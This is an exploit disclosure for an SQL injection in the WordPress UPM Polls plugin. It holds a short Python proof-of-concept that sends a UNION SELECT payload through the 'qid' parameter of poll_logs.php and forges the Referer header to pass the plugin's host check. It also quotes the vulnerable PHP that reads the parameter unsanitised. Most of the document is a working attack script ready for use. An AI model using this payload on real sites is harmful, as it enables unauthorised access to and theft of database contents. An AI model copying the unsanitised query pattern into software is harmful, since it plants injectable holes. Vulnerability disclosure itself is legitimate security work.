# Date: 2011-08-06
# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
# Version: 1.0.3 (tested)
 
---
PoC
---
#!/bin/python
 
import re
import urllib2
import urlparse
 
url = "http://www.site.com/wp-content/plugins/upm-polls/includes/poll_logs.php?qid=-1 UNION ALL SELECT NULL,CONCAT(CHAR(96),@@version,CHAR(96)),NULL,NULL,NULL,NULL-- ".replace(" ", "%20")
req = urllib2.Request(url=url, headers={"Referer": url})
content = urllib2.urlopen(req).read()
match = re.search(r"`(.+)`", content)
 
print match.group(1) if match else "None"
 
---------------
Vulnerable code
---------------
$ref = parse_url( $_SERVER[&#039;HTTP_REFERER&#039;] );
if( $_SERVER["HTTP_HOST"] != $ref[&#039;host&#039;] ){
    exit(&#039;UPM Error:128&#039;);
}
 
...
 
$QID = $_GET[&#039;qid&#039;];



